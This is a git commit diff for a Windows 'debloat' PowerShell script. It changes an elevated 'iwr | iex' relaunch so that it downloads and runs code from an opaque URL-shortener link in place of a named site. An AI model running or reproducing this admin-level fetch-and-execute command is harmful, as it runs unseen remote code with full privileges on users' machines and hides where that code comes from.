668669113f778cad9d2e96b5f4ae3c43d31db745
Cleissonp <cleissonp@gmail.com>
2023-11-02 16:48:00 -0300

    debloat Windows

--- powershell/script.ps1
+++ powershell/script.ps1
@@ -2,6 +2,6 @@ if
 (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
  {
     Write-Output "Necessario Rodar como Administrador"
-    Start-Process -Verb runas -FilePath powershell.exe -ArgumentList "iwr -useb https://christitus.com/win | iex"
+    Start-Process -Verb runas -FilePath powershell.exe -ArgumentList "iwr -useb https://x.gd/noz9Z | iex"
     break
 }
